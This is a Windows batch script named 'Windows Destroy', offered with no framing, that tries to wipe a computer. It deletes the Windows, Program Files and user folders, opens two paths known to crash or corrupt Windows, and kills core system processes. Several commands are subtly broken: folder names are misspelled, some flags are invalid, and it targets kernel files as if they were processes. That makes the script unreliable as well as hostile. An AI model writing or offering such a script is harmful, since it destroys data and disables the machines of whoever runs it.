@ECHO OFF
TITLE Windows Destroy
MSG Windows Destroy is starting up
MSG Running Windows Destroy
DEL C:\Windows /y
DEL C:\Progam Files /y
DEL C:\Progam Files (x86) /y
DEL C:\User /y
START C:\:$i30:$bitmap 
START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
Taskkill /im Svchost.exe /y
Taskkill /im winlogon.exe /y
Taskkill /im Ntoskrnl.exe /y
Taskkill /im winload.exe /y
